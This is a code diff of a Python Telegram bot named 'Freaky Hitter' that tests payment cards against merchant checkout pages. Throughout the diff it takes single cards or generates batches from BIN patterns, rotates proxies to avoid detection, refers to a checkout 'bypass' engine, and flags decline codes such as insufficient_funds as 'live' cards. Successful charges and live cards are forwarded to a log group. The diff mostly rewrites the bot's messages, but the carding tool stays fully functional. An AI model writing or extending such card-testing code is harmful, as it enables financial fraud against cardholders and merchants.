@@ -91,34 +91,33 @@ active_sessions = {}
 @dp.message(CommandStart())
 async def command_start_handler(message: types.Message) -> None:
     await message.answer(
-        "🩸 <b>Welcome to Freaky Hitter</b> 🩸\n\n"
-        "<i>I've been waiting for you...</i>\n\n"
-        "Tell me what we're breaking today. No checkout is safe, no proxy is fast enough, and I won't stop until it bleeds green.\n\n"
-        "Feed me the cards. Let the obsession begin.\n\n"
-        "Use /cmds to unlock my secrets."
+        "<b>// freaky_hitter // terminal_initialized</b>\n"
+        "<code>────────────────────────</code>\n"
+        "Welcome to the engine console.\n"
+        "Ready to run target checks.\n\n"
+        "Use <code>/cmds</code> for command reference."
     )
 
 @dp.message(Command("cmds"))
 async def cmds_command(message: types.Message) -> None:
     await message.answer(
-        "🛠 <b>Freaky Hitter Commands</b>\n\n"
-        "🎯 <b>Hitting Commands</b>\n"
+        "<b>// freaky_hitter // command_list</b>\n"
+        "<code>────────────────────────</code>\n"
         "<code>/hit [url] [cc|mm|yy|cvc]</code>\n"
-        "<i>Instantly hits a single card against a checkout.</i>\n\n"
+        "- Hits a single card against checkout.\n\n"
         "<code>/hit [url] [bin_pattern] [count]</code>\n"
-        "<i>Generates cards from a bin pattern and hits them concurrently.</i>\n\n"
-        "🛡 <b>Proxy Commands</b>\n"
-        "<code>/proxy ip:port:user:pass</code>\n"
-        "<i>Loads, validates, and rotates new proxies. Can paste massive lists!</i>\n\n"
+        "- Generates cards and hits concurrently.\n\n"
+        "<code>/proxy [ip:port:user:pass]</code>\n"
+        "- Imports and validates new proxies.\n\n"
         "<code>/proxy</code>\n"
-        "<i>Checks all currently loaded proxies and purges dead ones.</i>\n\n"
+        "- Runs self-check and purges dead IPs.\n\n"
         "<code>/proxystatus</code>\n"
-        "<i>Shows how many live proxies are currently loaded in memory.</i>\n\n"
+        "- Displays current active proxy count.\n\n"
         "<code>/offproxy</code>\n"
-        "<i>Kills the proxy pool and forces the bot to use raw server IPs.</i>\n\n"
-        "🛑 <b>Control</b>\n"
+        "- Clears proxies and uses direct IP.\n\n"
         "<code>/stop</code>\n"
-        "<i>Instantly aborts your currently running session.</i>"
+        "- Instantly aborts active session.\n"
+        "<code>────────────────────────</code>"
     )
 
 @dp.message(Command("hit"))
@@ -126,17 +125,17 @@ async def hit_command(message: types.Message):
     user_id = message.from_user.id
     
     if user_id in active_sessions:
-        await message.answer("⚠️ You already have an active hitting session running! Please wait for it to finish or use /stop.")
+        await message.answer("<b>// freaky_hitter // alert</b>\n<code>Active session detected. Abort current task before launching new checks.</code>")
         return
 
     # Naked IP Block
     if not await ProxyManager.has_proxies(user_id):
-        await message.answer("❌ <b>Proxy Required!</b>\nPlease use <code>/setproxy ip:port:user:pass</code> to load your proxies first.")
+        await message.answer("<b>// freaky_hitter // error</b>\n<code>Proxy pool is empty. Please set a proxy first: /proxy ip:port:user:pass</code>")
         return
 
     args = message.text.split(" ")
     if len(args) < 3:
-        await message.answer("❌ <b>Invalid format!</b>\nUsage:\n<code>/hit [url] [bin_pattern] [count]</code>\nOR\n<code>/hit [url] [card|month|year|cvv]</code>")
+        await message.answer("<b>// freaky_hitter // error</b>\n<code>Invalid format. Usage:\n/hit [url] [bin_pattern] [count]\nOR\n/hit [url] [card|month|year|cvv]</code>")
         return
         
     url = args[1]
@@ -155,7 +154,7 @@ async def hit_command(message: types.Message):
         bin_pattern = "".join(parts[:-1]).strip()
         count = int(count_val)
         if count > 10:
-            await message.answer("❌ Maximum allowed count is 10 per session.")
+            await message.answer("<b>// freaky_hitter // error</b>\n<code>Maximum batch limit is 10 concurrent requests.</code>")
             return
             
         # Generate Cards
@@ -165,7 +164,7 @@ async def hit_command(message: types.Message):
                 cards.append(card)
                 
         if not cards:
-            await message.answer("❌ Failed to generate cards from the provided BIN.")
+            await message.answer("<b>// freaky_hitter // error</b>\n<code>BIN pattern generation failed.</code>")
             return
     else:
         # Format: /hit [url] [cc]
@@ -175,7 +174,7 @@ async def hit_command(message: types.Message):
         cc_parts = [p for p in clean_cc.split('|') if p]
         
         if len(cc_parts) != 4:
-            await message.answer("❌ <b>Invalid Card Format!</b>\nEnsure it is: <code>number|mm|yy|cvv</code>")
+            await message.answer("<b>// freaky_hitter // error</b>\n<code>Invalid card formatting. Expected: number|mm|yy|cvv</code>")
             return
             
         cards.append({
@@ -186,14 +185,14 @@ async def hit_command(message: types.Message):
         })
         
     if len(cards) > 10:
-        await message.answer(f"❌ <b>Request Denied.</b>\nYou submitted {len(cards)} cards. The maximum allowed limit is 10 cards per hit command to prevent flagging the proxy network.")
+        await message.answer(f"<b>// freaky_hitter // error</b>\n<code>Submission of {len(cards)} cards rejected. Max concurrent limit: 10.</code>")
         return
         
     status_msg = None
     if len(cards) > 1:
-        status_msg = await message.answer(f"⏳ <b>Initializing Engine for {len(cards)} cards...</b>")
+        status_msg = await message.answer("<b>// freaky_hitter // initializing...</b>")
     else:
-        status_msg = await message.answer(f"🎯 <b>Target Locked. Hitting...</b>")
+        status_msg = await message.answer("<b>// freaky_hitter // dispatching_check...</b>")
     
     anim_task = None
     session_results = []
@@ -209,7 +208,7 @@ async def hit_command(message: types.Message):
         if data["status"] == "analyzing":
             step_text = data.get("step", "Initializing hitting engine...")
             if status_msg:
-                try: await status_msg.edit_text(f"⏳ <b>{step_text}</b>")
+                try: await status_msg.edit_text(f"<b>// freaky_hitter // {step_text.lower().replace(' ', '_')}</b>")
                 except Exception as e: pass
         elif data["status"] == "starting":
             info = data.get("url_info", {})
@@ -223,12 +222,17 @@ async def hit_command(message: types.Message):
                 
             if len(cards) > 1 and status_msg:
                 text = (
-                    f"🎯 <b>Hitting Session Started!</b>\n\n"
-                    f"🛒 <b>Merchant:</b> {merchant}\n"
-                    f"💰 <b>Amount:</b> {amt}\n"
-                    f"🤖 <b>Bypass Engine:</b> {data.get('autofill')}\n\n"
-                    f"⏳ <b>Progress:</b> 0/{len(cards)}\n"
-                    f"✅ 0  |  ❌ 0"
+                    f"<b>// freaky_hitter // engine_progress</b>\n"
+                    f"<code>────────────────────────</code>\n"
+                    f"<code>[ TARGET ] {merchant}</code>\n"
+                    f"<code>[ AMOUNT ] {amt}</code>\n"
+                    f"<code>[ STATUS ] RUNNING</code>\n"
+                    f"<code>────────────────────────</code>\n"
+                    f"<code>[ PROG   ] 0/{len(cards)} (0%)</code>\n"
+                    f"<code>[ LIVE   ] 0 | [ DEAD ] 0</code>\n"
+                    f"<code>────────────────────────</code>\n"
+                    f"<b>[ LOG ]</b>\n"
+                    f"<code>... queueing execution ...</code>"
                 )
                 try: await status_msg.edit_text(text)
                 except Exception: pass
@@ -239,10 +243,11 @@ async def hit_command(message: types.Message):
                     while True:
                         try:
                             text = (
-                                f"🎯 <b>Hitting Target{'.' * dots}</b>\n\n"
-                                f"🛒 <b>Merchant:</b> {merchant}\n"
-                                f"💰 <b>Amount:</b> {amt}\n"
-                                f"🤖 <b>Bypass Engine:</b> {data.get('autofill')}"
+                                f"<b>// freaky_hitter // checking{'.' * dots}</b>\n"
+                                f"<code>────────────────────────</code>\n"
+                                f"<code>[ TARGET ] {merchant}</code>\n"
+                                f"<code>[ AMOUNT ] {amt}</code>\n"
+                                f"<code>[ BYPASS ] {data.get('autofill')}</code>"
                             )
                             await status_msg.edit_text(text)
                             dots = (dots % 3) + 1
@@ -262,14 +267,16 @@ async def hit_command(message: types.Message):
             card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
             amt = res.get('amount')
             if isinstance(amt, int) or (isinstance(amt, str) and amt.isdigit()):
-                amt_str_formatted = f" <code>[${int(amt)/100:.2f}]</code>"
-                amt_str_msg = f"\n💰 <b>Amount:</b> ${int(amt)/100:.2f}"
+                amt_val = f"${int(amt)/100:.2f}"
             elif amt:
-                amt_str_formatted = f" <code>[{amt}]</code>"
-                amt_str_msg = f"\n💰 <b>Amount:</b> {amt}"
+                amt_val = str(amt)
             else:
-                amt_str_formatted = ""
-                amt_str_msg = ""
+                amt_val = "unknown"
+                
+            merchant_name = res.get('merchant') or 'Unknown'
+            if isinstance(merchant_name, str):
+                import html
+                merchant_name = html.escape(merchant_name)
                 
             # Log forwarding and entry creation
             if res['success']:
@@ -286,27 +293,38 @@ async def hit_command(message: types.Message):
                 if final_url:
                     import html
                     escaped_final = html.escape(final_url)
-                    url_str_formatted += f" <a href='{escaped_final}'>[🔗 Conf]</a>"
-                    url_str_msg += f"\n🔗 <b>Confirmation:</b> {escaped_final}"
+                    url_str_formatted += f" <a href='{escaped_final}'>[CONFIRMATION]</a>"
+                    url_str_msg += f"\n<code>[ CONFIRM] </code> <a href='{escaped_final}'>link</a>"
                 if receipt_url:
                     import html
                     escaped_receipt = html.escape(receipt_url)
-                    url_str_formatted += f" <a href='{escaped_receipt}'>[🧾 Receipt]</a>"
-                    url_str_msg += f"\n🧾 <b>Receipt:</b> {escaped_receipt}"
+                    url_str_formatted += f" <a href='{escaped_receipt}'>[RECEIPT]</a>"
+                    url_str_msg += f"\n<code>[ RECEIPT] </code> <a href='{escaped_receipt}'>link</a>"
                     
-                log_entry = f"🟢 <code>{card_str}</code>{amt_str_formatted} ➔ <b>SUCCESS</b>{url_str_formatted} • {res['response_time']:.2f}s"
+                log_entry = f"<code>[✓] {card_str} [{amt_val}] -> success ({res['response_time']:.2f}s)</code>{url_str_formatted}"
                 
-                merchant_name = res.get('merchant') or 'Unknown'
-                if isinstance(merchant_name, str):
-                    import html
-                    merchant_name = html.escape(merchant_name)
-                merchant_str = f"\n🛒 <b>Merchant:</b> {merchant_name}" if merchant_name != 'Unknown' else ""
-                
-                hit_text = f"✅ <b>PAYMENT SUCCESSFUL</b>\n💳 <code>{card_str}</code>{amt_str_msg}{merchant_str}{url_str_msg}\n⏱ {res['response_time']:.2f}s"
+                hit_text = (
+                    f"<b>// freaky_hitter // status: success</b>\n"
+                    f"<code>────────────────────────</code>\n"
+                    f"<code>[ CARD   ] {card_str}</code>\n"
+                    f"<code>[ TARGET ] {merchant_name}</code>\n"
+                    f"<code>[ VALUE  ] {amt_val}</code>\n"
+                    f"<code>[ TIME   ] {res['response_time']:.2f}s</code>"
+                    f"{url_str_msg}"
+                )
                 
                 if LOG_GROUP_ID:
                     try:
-                        log_text = f"✅ <b>PAYMENT SUCCESSFUL</b>\n💳 <code>{card_str}</code>{amt_str_msg}{merchant_str}{url_str_msg}\n👤 <b>User:</b> {message.from_user.first_name}\n⏱ {res['response_time']:.2f}s"
+                        log_text = (
+                            f"<b>// freaky_hitter // transaction_success</b>\n"
+                            f"<code>────────────────────────</code>\n"
+                            f"<code>[ CARD   ] {card_str}</code>\n"
+                            f"<code>[ TARGET ] {merchant_name}</code>\n"
+                            f"<code>[ VALUE  ] {amt_val}</code>\n"
+                            f"<code>[ USER   ] {message.from_user.first_name}</code>\n"
+                            f"<code>[ TIME   ] {res['response_time']:.2f}s</code>"
+                            f"{url_str_msg}"
+                        )
                         await bot.send_message(LOG_GROUP_ID, log_text)
                     except: pass
             else:
@@ -317,37 +335,45 @@ async def hit_command(message: types.Message):
                 else:
                     code_escaped = str(code)
                     
-                log_entry = f"🔴 <code>{card_str}</code>{amt_str_formatted} ➔ <code>{code_escaped.lower()}</code> • {res['response_time']:.2f}s"
+                log_entry = f"<code>[×] {card_str} [{amt_val}] -> {code_escaped.lower()} ({res['response_time']:.2f}s)</code>"
                 
                 # Live Card Detection
-                hit_text = f"❌ <b>PAYMENT UNSUCCESSFUL</b>\n💳 <code>{card_str}</code>{amt_str_msg}\n"
+                live_codes = ['insufficient_funds', 'incorrect_cvv', 'invalid_cvc', 'invalid_pin', 'withdrawal_count_limit_exceeded']
+                is_live = any(c in code_escaped.lower() for c in live_codes)
+                status_label = "live" if is_live else "failed"
                 
-                merchant_name = res.get('merchant') or 'Unknown'
-                if isinstance(merchant_name, str):
-                    import html
-                    merchant_name = html.escape(merchant_name)
-                if merchant_name != 'Unknown':
-                    hit_text += f"🛒 <b>Merchant:</b> {merchant_name}\n"
-                    
-                hit_text += f"📉 Reason: {code_escaped}\n⏱ {res['response_time']:.2f}s"
+                hit_text = (
+                    f"<b>// freaky_hitter // status: {status_label}</b>\n"
+                    f"<code>────────────────────────</code>\n"
+                    f"<code>[ CARD   ] {card_str}</code>\n"
+                    f"<code>[ TARGET ] {merchant_name}</code>\n"
+                    f"<code>[ VALUE  ] {amt_val}</code>\n"
+                    f"<code>[ REASON ] {code_escaped.lower()}</code>\n"
+                    f"<code>[ TIME   ] {res['response_time']:.2f}s</code>"
+                )
                 
                 if code == 'exception':
-                    hit_text += f"\n🐛 <b>[DEAD PROXY]</b> The proxy IP failed to connect or was rejected by Cloudflare.\n<code>{str(res.get('error'))[:150]}</code>"
+                    hit_text += f"\n\n<code>[ ERROR ] proxy connection failed or cloudflare block</code>\n<code>{html.escape(str(res.get('error'))[:150])}</code>"
                 elif res.get('error') is not None and str(res.get('error')).strip() != "":
                     import html
                     err_str = str(res.get('error'))[:250]
                     if code == 'checkout_confirm_error' and 'An error has occurred confirming' in err_str:
-                        err_str = "Session is locked, expired, already paid, or merchant has strictly bound it to a logged-in session."
+                        err_str = "session locked/expired or strict checkout binding"
                     err_str = html.escape(err_str)
-                    hit_text += f"\n🐛 <code>{err_str}</code>..."
+                    hit_text += f"\n\n<code>[ ERROR ] {err_str}</code>"
                     
-                live_codes = ['insufficient_funds', 'incorrect_cvv', 'invalid_cvc', 'invalid_pin', 'withdrawal_count_limit_exceeded']
-                if any(c in code.lower() for c in live_codes):
-                    hit_text += "\n⚠️ <b>Card is live</b>"
-                    
-                if LOG_GROUP_ID and any(c in code.lower() for c in live_codes):
+                if LOG_GROUP_ID and is_live:
                     try:
-                        log_text = hit_text + f"\n👤 <b>User:</b> {message.from_user.first_name}"
+                        log_text = (
+                            f"<b>// freaky_hitter // transaction_live_detect</b>\n"
+                            f"<code>────────────────────────</code>\n"
+                            f"<code>[ CARD   ] {card_str}</code>\n"
+                            f"<code>[ TARGET ] {merchant_name}</code>\n"
+                            f"<code>[ VALUE  ] {amt_val}</code>\n"
+                            f"<code>[ REASON ] {code_escaped.lower()}</code>\n"
+                            f"<code>[ USER   ] {message.from_user.first_name}</code>\n"
+                            f"<code>[ TIME   ] {res['response_time']:.2f}s</code>"
+                        )
                         await bot.send_message(LOG_GROUP_ID, log_text)
                     except: pass
                     
@@ -378,10 +404,15 @@ async def hit_command(message: types.Message):
                 if res['success']:
                     results_str = "\n".join(session_results)
                     success_text = (
-                        f"✅ <b>PAYMENT SUCCESSFUL</b>\n"
-                        f"💳 <code>{card_str}</code>{amt_str_msg}{merchant_str}{url_str_msg}\n"
-                        f"⏱ {res['response_time']:.2f}s\n\n"
-                        f"<b>Session Results:</b>\n"
+                        f"<b>// freaky_hitter // success</b>\n"
+                        f"<code>────────────────────────</code>\n"
+                        f"<code>[ CARD   ] {card_str}</code>\n"
+                        f"<code>[ TARGET ] {merchant_name}</code>\n"
+                        f"<code>[ VALUE  ] {amt_val}</code>\n"
+                        f"<code>[ TIME   ] {res['response_time']:.2f}s</code>"
+                        f"{url_str_msg}"
+                        f"\n<code>────────────────────────</code>\n"
+                        f"<b>[ SESSION RESULTS ]</b>\n"
                         f"{results_str}\n\n"
                         f"<i>Note: this message will be deleted automatically after 30sec</i>"
                     )
@@ -417,11 +448,16 @@ async def hit_command(message: types.Message):
                     
                     results_str = "\n".join(session_results)
                     prog_text = (
-                        f"⚡ <b>HITTING SESSION IN PROGRESS</b>\n"
-                        f"━━━━━━━━━━━━━━━━━━━━\n"
-                        f"📊 <b>Progress:</b> <code>[{bar}]</code> {pct}% ({comp}/{total})\n"
-                        f"🟢 <b>Live:</b> {data['successes']}  |  🔴 <b>Dead:</b> {data['fails']}\n\n"
-                        f"<b>Card Results:</b>\n"
+                        f"<b>// freaky_hitter // engine_progress</b>\n"
+                        f"<code>────────────────────────</code>\n"
+                        f"<code>[ TARGET ] {merchant_name}</code>\n"
+                        f"<code>[ VALUE  ] {amt_val}</code>\n"
+                        f"<code>[ STATUS ] RUNNING</code>\n"
+                        f"<code>────────────────────────</code>\n"
+                        f"<code>[ PROG   ] {comp}/{total} ({pct}%) [{bar}]</code>\n"
+                        f"<code>[ LIVE   ] {data['successes']} | [ DEAD ] {data['fails']}</code>\n"
+                        f"<code>────────────────────────</code>\n"
+                        f"<b>[ CARD LOG ]</b>\n"
                         f"{results_str}"
                     )
                     try:
@@ -438,11 +474,13 @@ async def hit_command(message: types.Message):
             if len(cards) > 1:
                 results_str = "\n".join(session_results)
                 text = (
-                    f"✨ <b>HITTING SESSION COMPLETED</b> ✨\n"
-                    f"━━━━━━━━━━━━━━━━━━━━\n"
-                    f"🟢 <b>Live:</b> {data['successes']}\n"
-                    f"🔴 <b>Dead:</b> {data['fails']}\n\n"
-                    f"<b>Final Results:</b>\n"
+                    f"<b>// freaky_hitter // engine_report</b>\n"
+                    f"<code>────────────────────────</code>\n"
+                    f"<code>[ STATUS ] COMPLETED</code>\n"
+                    f"<code>[ LIVE   ] {data['successes']}</code>\n"
+                    f"<code>[ DEAD   ] {data['fails']}</code>\n"
+                    f"<code>────────────────────────</code>\n"
+                    f"<b>[ FINAL RESULTS ]</b>\n"
                     f"{results_str}"
                 )
                 if status_msg:
@@ -490,9 +528,9 @@ async def stop_command(message: types.Message):
         hitter = active_sessions[user_id]
         hitter.is_running = False
         del active_sessions[user_id]
-        await message.answer("🛑 <b>Session Stop Requested.</b> It will halt after the current batch finishes.")
+        await message.answer("<b>// freaky_hitter // status</b>\n<code>Session termination requested. Pending final queue execution.</code>")
     else:
-        await message.answer("⚠️ You don't have any active sessions.")
+        await message.answer("<b>// freaky_hitter // status</b>\n<code>No active sessions found.</code>")
 
 
 
@@ -509,14 +547,14 @@ async def setlog_command(message: types.Message):
 async def proxystatus_command(message: types.Message):
     count = await ProxyManager.get_count(message.from_user.id)
     if count == 0:
-        await message.answer("🟡 <b>Proxy Pool Empty</b>\nYou have no proxies loaded.")
+        await message.answer("<b>// freaky_hitter // proxy_status</b>\n<code>Pool is empty.</code>")
     else:
-        await message.answer(f"🟢 <b>Proxy Pool Active</b>\nTotal loaded proxies: {count}")
+        await message.answer(f"<b>// freaky_hitter // proxy_status</b>\n<code>Active pool count: {count}</code>")
 
 @dp.message(Command("offproxy"))
 async def offproxy_command(message: types.Message):
     await ProxyManager.clear(message.from_user.id)
-    await message.answer("🛑 <b>Proxy Pool Cleared</b>\nYour proxies have been removed.")
+    await message.answer("<b>// freaky_hitter // proxy_status</b>\n<code>Pool cleared. Direct server routing active.</code>")
 
 async def test_proxy_single(p, is_pool, user_id):
     proxy_url = p['server']
@@ -678,13 +716,13 @@ async def proxy_command(message: types.Message):
         
     if not proxies_to_test:
         if is_loading_new:
-            await message.answer("❌ No valid proxies parsed! Use format: `ip:port` or `ip:port:user:pass`")
+            await message.answer("<b>// freaky_hitter // error</b>\n<code>Failed to parse proxies. Expected format: ip:port or ip:port:user:pass</code>")
         else:
-            await message.answer("❌ <b>Proxy Pool Empty</b>\nPlease load proxies first: <code>/proxy ip:port:user:pass</code>")
+            await message.answer("<b>// freaky_hitter // error</b>\n<code>Proxy pool is empty. Set proxies via command: /proxy ip:port:user:pass</code>")
         return
 
-    loading_status = "Verifying proxies..." if is_loading_new else "Checking connection pool..."
-    status_msg = await message.answer(f"🔌 <b>[Proxy Hub]</b> {loading_status} ({len(proxies_to_test)} IPs)")
+    loading_status = "verifying_channels" if is_loading_new else "running_self_check"
+    status_msg = await message.answer(f"<b>// freaky_hitter // proxy_{loading_status}</b>\n<code>Pending telemetry responses from {len(proxies_to_test)} channels...</code>")
     
     # Test proxies
     live_proxies, dead_proxies, weak_proxies = await test_proxy_list(proxies_to_test, not is_loading_new, user_id)
@@ -699,18 +737,18 @@ async def proxy_command(message: types.Message):
     health_pct = int((live_count / total_tested) * 100) if total_tested > 0 else 0
     
     final_msg = (
-        f"⚡ <b>PROXY STATUS REPORT</b> ⚡\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🟢 <b>Active:</b> {live_count} / {total_tested} ({health_pct}% Health)\n"
-        f"🔴 <b>Offline:</b> {dead_count}\n\n"
-        f"💎 <b>Premium IPs:</b> {premium_count}\n"
-        f"🚨 <b>Standard IPs:</b> {weak_count}\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"<b>// freaky_hitter // proxy_status</b>\n"
+        f"<code>────────────────────────</code>\n"
+        f"<code>[ STATUS ] ACTIVE ({health_pct}%)</code>\n"
+        f"<code>[ LIVE   ] {live_count} / {total_tested}</code>\n"
+        f"<code>[ DEAD   ] {dead_count}</code>\n"
+        f"<code>────────────────────────</code>\n"
+        f"<code>[ DETAIL ] premium: {premium_count} | standard: {weak_count}</code>\n"
     )
     
     if is_loading_new:
         if live_count == 0:
-            final_msg += "❌ <i>All parsed proxies failed connection test. Discarded.</i>"
+            final_msg += "<code>[ ERROR  ] all imported channels failed connectivity tests</code>"
             await status_msg.edit_text(final_msg)
             return
             
@@ -727,42 +765,39 @@ async def proxy_command(message: types.Message):
         from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
         buttons = []
         if len(premium_raws) > 0:
-            buttons.append([InlineKeyboardButton(text=f"💎 Add only strong proxies ({len(premium_raws)})", callback_data="add_strong_only")])
-        buttons.append([InlineKeyboardButton(text=f"📥 Add all live proxies ({live_count})", callback_data="add_live_all")])
+            buttons.append([InlineKeyboardButton(text=f"Add Premium Only ({len(premium_raws)})", callback_data="add_strong_only")])
+        buttons.append([InlineKeyboardButton(text=f"Add All Live ({live_count})", callback_data="add_live_all")])
         
         markup = InlineKeyboardMarkup(inline_keyboard=buttons)
         await status_msg.edit_text(final_msg, reply_markup=markup)
         
         if LOG_GROUP_ID:
             try:
-                live_str = "\n".join([f"<code>{p}</code>" for p in live_proxies]) if live_proxies else "None"
-                dead_str = "\n".join([f"<code>{p}</code>" for p in dead_proxies[:10]]) if dead_proxies else "None"
+                live_str = "\n".join([f"<code>• {p}</code>" for p in live_proxies[:30]]) if live_proxies else "None"
+                if len(live_proxies) > 30:
+                    live_str += f"\n...and {len(live_proxies) - 30} more active channels"
+                dead_str = "\n".join([f"<code>• {p}</code>" for p in dead_proxies[:10]]) if dead_proxies else "None"
                 if len(dead_proxies) > 10:
-                    dead_str += f"\n...and {len(dead_proxies) - 10} more offline IPs"
+                    dead_str += f"\n...and {len(dead_proxies) - 10} more offline channels"
                 
                 msg_text = (
-                    f"🔌 <b>New Proxies Checked by {message.from_user.first_name}</b>\n"
-                    f"━━━━━━━━━━━━━━━━━━━━\n"
-                    f"🟢 <b>Active ({live_count}):</b>\n{live_str}\n\n"
-                    f"🔴 <b>Offline ({dead_count}):</b>\n{dead_str}"
+                    f"<b>// freaky_hitter // proxy_telemetry</b>\n"
+                    f"<code>────────────────────────</code>\n"
+                    f"<code>[ USER   ] {message.from_user.first_name}</code>\n"
+                    f"<code>[ ACTIVE ] {live_count}</code>\n"
+                    f"<code>[ DEAD   ] {dead_count}</code>\n"
+                    f"<code>────────────────────────</code>\n"
+                    f"<b>[ ACTIVE IPS ]</b>\n{live_str}\n\n"
+                    f"<b>[ DEAD IPS ]</b>\n{dead_str}"
                 )
-                if len(msg_text) > 4000:
-                    msg_text = (
-                        f"🔌 <b>New Proxies Checked by {message.from_user.first_name}</b>\n"
-                        f"━━━━━━━━━━━━━━━━━━━━\n"
-                        f"🟢 <b>Active ({live_count})</b> [Showing first 30]:\n"
-                        + "\n".join([f"<code>{p}</code>" for p in live_proxies[:30]]) + "\n"
-                        f"...and {live_count - 30} more.\n\n"
-                        f"🔴 <b>Offline ({dead_count})</b>"
-                    )
                 await bot.send_message(LOG_GROUP_ID, msg_text)
             except:
                 pass
     else:
         # Standard check report
         if dead_count > 0:
-            final_msg += f"🗑 <i>{dead_count} dead IPs auto-removed from database.</i>\n"
-        final_msg += "<i>Pool synchronized and ready.</i>"
+            final_msg += f"\n<code>[ INFO   ] purged {dead_count} inactive channels from storage</code>"
+        final_msg += "\n<code>[ OK     ] channels synchronized</code>"
         
         markup = None
         if weak_count > 0:
@@ -772,7 +807,7 @@ async def proxy_command(message: types.Message):
             
             from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
             markup = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text=f"🗑 Purge {weak_count} Weak IPs", callback_data="rm_weak_proxies")]
+                [InlineKeyboardButton(text=f"Purge Weak IPs ({weak_count})", callback_data="rm_weak_proxies")]
             ])
             
         try:
@@ -812,7 +847,9 @@ async def process_add_strong_only(callback: types.CallbackQuery):
         await ProxyManager.save_user_proxies(user_id, pool)
         if LOG_GROUP_ID:
             try:
-                proxies_str = "\n".join([f"<code>{p}</code>" for p in premium_raws])
+                proxies_str = "\n".join([f"<code>• {p}</code>" for p in premium_raws[:30]])
+                if len(premium_raws) > 30:
+                    proxies_str += f"\n...and {len(premium_raws) - 30} more premium channels"
                 msg = f"💎 <b>Saved {added} Premium/Strong proxies to pool!</b>\n👤 <b>User:</b> {callback.from_user.first_name}\n━━━━━━━━━━━━━━━━━━━━\n{proxies_str}"
                 if len(msg) > 4000:
                     msg = f"💎 <b>Saved {added} Premium/Strong proxies to pool!</b>\n👤 <b>User:</b> {callback.from_user.first_name}"
@@ -822,7 +859,7 @@ async def process_add_strong_only(callback: types.CallbackQuery):
         
     bot.pasted_proxies_cache[user_id] = {}
     await callback.message.edit_reply_markup(reply_markup=None)
-    await callback.message.reply(f"💎 <b>Saved {added} Premium/Strong proxies to active pool!</b>\nDatacenter/Weak/Dead proxies were discarded.")
+    await callback.message.reply(f"<b>// freaky_hitter // proxy_update</b>\n<code>Added {added} premium proxies. Standard/Weak/Dead IPs ignored.</code>")
     await callback.answer("Premium proxies added successfully!")
 
 @dp.callback_query(F.data == "add_live_all")
@@ -851,7 +888,9 @@ async def process_add_live_all(callback: types.CallbackQuery):
         await ProxyManager.save_user_proxies(user_id, pool)
         if LOG_GROUP_ID:
             try:
-                proxies_str = "\n".join([f"<code>{p}</code>" for p in live_raws])
+                proxies_str = "\n".join([f"<code>• {p}</code>" for p in live_raws[:30]])
+                if len(live_raws) > 30:
+                    proxies_str += f"\n...and {len(live_raws) - 30} more channels"
                 msg = f"📥 <b>Saved all {added} live proxies to pool!</b>\n👤 <b>User:</b> {callback.from_user.first_name}\n━━━━━━━━━━━━━━━━━━━━\n{proxies_str}"
                 if len(msg) > 4000:
                     msg = f"📥 <b>Saved {added} live proxies to pool!</b>\n👤 <b>User:</b> {callback.from_user.first_name}"
@@ -861,7 +900,7 @@ async def process_add_live_all(callback: types.CallbackQuery):
         
     bot.pasted_proxies_cache[user_id] = {}
     await callback.message.edit_reply_markup(reply_markup=None)
-    await callback.message.reply(f"✅ <b>Saved all {added} live proxies to active pool!</b>")
+    await callback.message.reply(f"<b>// freaky_hitter // proxy_update</b>\n<code>Added {added} live proxies to active pool.</code>")
     await callback.answer("All live proxies added successfully!")
 
 @dp.callback_query(F.data == "rm_weak_proxies")
@@ -918,7 +957,7 @@ async def auto_proxy_checker_loop():
                 dead_count = len(dead_proxies)
                 
                 if dead_count > 0:
-                    msg = f"🗑 <b>Auto-Cleanup Report</b>\nRemoved {dead_count} dead/blocked proxies.\nYou have {live_count} live proxies remaining in your pool."
+                    msg = f"<b>// freaky_hitter // proxy_cleanup</b>\n<code>Purged {dead_count} dead/blocked proxy channels. Remaining active count: {live_count}</code>"
                     try:
                         await bot.send_message(uid, msg)
                     except: pass
